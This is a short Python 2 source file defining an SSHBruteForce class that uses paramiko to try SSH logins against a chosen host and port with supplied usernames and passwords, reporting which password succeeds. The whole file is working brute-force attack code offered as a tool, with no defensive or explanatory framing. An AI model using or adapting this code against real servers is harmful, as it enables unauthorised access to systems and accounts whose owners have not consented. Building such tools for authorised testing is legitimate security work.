#!/usr/bin/env python
# -*- coding: utf-8 -*-

import paramiko
import itertools
import string
import crypt
import socket

class SSHBruteForce():
    def __init__(self, f_debug = False):
        self.inPort = 22
        self.f_debug = f_debug

    def set_host_name(self, stHostname):
        self.stHostname = stHostname

    def set_host_port(self, inPort):
        self.inPort = inPort

    def dprint(self, stMessage):
        if self.f_debug:
            print(stMessage)

    def login(self, stUsername, stPassword):
        try:
            ssh = paramiko.SSHClient()
            ssh.load_system_host_keys()
            ssh.set_missing_host_key_policy(paramiko.MissingHostKeyPolicy())
            self.dprint("Try: " + self.stHostname)
            ssh.connect(hostname = self.stHostname , port=self.inPort, username=stUsername, password=stPassword)
            self.dprint("Correct: "+ stPassword)
            ssh.close()
            return True
        except paramiko.AuthenticationException, error:
            self.dprint("Invarid : "+ stPassword)
        except socket.error, error:
            print error
        except paramiko.SSHException, error:
            print error
        except Exception, error:
            print str(error)
        ssh.close()
        return False

